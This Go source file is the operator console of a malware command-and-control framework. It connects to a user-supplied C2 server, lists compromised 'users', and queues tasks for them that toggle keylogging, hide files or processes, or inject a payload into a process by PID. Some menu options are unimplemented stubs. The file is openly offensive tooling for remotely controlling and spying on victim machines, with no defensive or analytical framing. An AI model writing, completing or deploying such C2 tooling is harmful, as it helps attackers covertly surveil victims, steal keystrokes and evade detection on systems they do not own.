package main

import (
  "fmt"
  "net/http"
  "io/ioutil"
  "os/exec"
  "os"
  "bytes"
  "encoding/json"
)

func clears() {
  cmd := exec.Command("clear")
  cmd.Stdout = os.Stdout
  cmd.Run()
}
// TODO: 
/*
GET   /users/<user>
GET   /tasks/<user>
GET   /results/<user>
*/
func getUsers(Link string){
  resp, err := http.Get(Link+"/users")
  if err != nil {
    fmt.Println("Error sending request")
    return
  }
  defer resp.Body.Close()
  
  body, err := ioutil.ReadAll(resp.Body)
  if err != nil {
    fmt.Println("Error reading message")
    return
  }
  fmt.Println(string(body))
}

func addTask(url string, name string, id int, arg1 string, arg2 string) {
  endp := url + "/tasks/" + name
  
  type task struct {
  	Name string `json:"name"`
  	ID   int    `json:"id"`
  	Arg1 string `json:"arg1"`
  	Arg2 string `json:"arg2"`
  }
  
  taskData := task{
  	Name: name,
  	ID:   id,
  	Arg1: arg1,
  	Arg2: arg2,
  }
  
  // Marshal the task struct into JSON
  data, err := json.Marshal(taskData)
  if err != nil {
  	fmt.Println("Error marshaling JSON:", err)
  	return
  }
  
  // Send a POST request with the JSON data
  resp, err := http.Post(endp, "application/json", bytes.NewBuffer(data))
  if err != nil {
  	fmt.Println("Error sending request:", err)
  	return
  }
  defer resp.Body.Close()
  
  body, err := ioutil.ReadAll(resp.Body)
  if err != nil {
  	fmt.Println("Error reading response:", err)
  	return
  }
  
  fmt.Println(string(body))
}

func main() {
  var IP string
  var Port string
  var Option int
  var Whatever rune
  // for AddTask 
  var name string
  var id int
  var arg1 string
  var arg2 string
  // just the link...
  Link := "http://"
  
  fmt.Println("---------[ Command & Control Client ]---------")
  // TODO: add config file to make this less annoying
  fmt.Print("Server IP: ")
  fmt.Scanln(&IP)
  fmt.Print("Server Port: ")
  fmt.Scanln(&Port)
  
  Link += IP + ":" + Port
  for ;; {
    clears();
    fmt.Println("1 > List all users")               // WORKS
    fmt.Println("2 > Show specifc user")
    fmt.Println("3 > Show results of specific user")
    fmt.Println("4 > Add new task to queue")        // WORKS
    fmt.Println("5 > Show tasks in queue\n")
    fmt.Print("Please pick an option\n > ")
    fmt.Scanln(&Option)
    switch Option {
    case 1:
      getUsers(Link)
    case 2:
    case 3:
    case 4:
      fmt.Print(" > Username: ")
      fmt.Scanln(&name)
      fmt.Println("1 > Keylogging on/off")
      fmt.Println("2 > Hide/Show File")
      fmt.Println("3 > Hide/Show Process")
      fmt.Println("4 > Inject into process <PID> <PAYLOAD>\n")
      fmt.Print(" > ID: ")
      fmt.Scanln(&id)
      fmt.Print(" > 1st Argument (Opt.): ")
      fmt.Scanln(&arg1)
      fmt.Print(" > 2nd Argument (Opt.): ")
      fmt.Scanln(&arg2)
      addTask(Link, name, id, arg1, arg2)
    case 5:
    default:
      fmt.Println("[x] Invalid Option!")
    }
    fmt.Scanln(&Whatever)
  }
}
